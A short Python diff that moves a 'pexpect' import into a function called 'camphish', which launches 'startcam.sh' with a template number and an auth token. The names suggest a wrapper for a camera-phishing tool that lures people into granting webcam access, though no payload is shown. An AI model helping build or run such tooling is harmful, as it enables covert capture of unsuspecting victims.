@@ -3,11 +3,9 @@ import shlex
 import subprocess
 import threading
 
-import pexpect
 import platform
 import sys
 import re
-from pexpect import spawn
 
 global cstm_data
 global camphish_proc
@@ -56,7 +54,7 @@ def camphish(template: int, autthoken: str) -> str:
     config = configparser.ConfigParser( )
     config.read('app.cfg')
     if platform.system( ) == 'Linux':
-
+        import pexpect
         camphish_proc = pexpect.spawn(f'bash  startcam.sh 1 {template}')
         camphish_proc.timeout = int(config['RUNTIME']['TIMEOUT'])
 
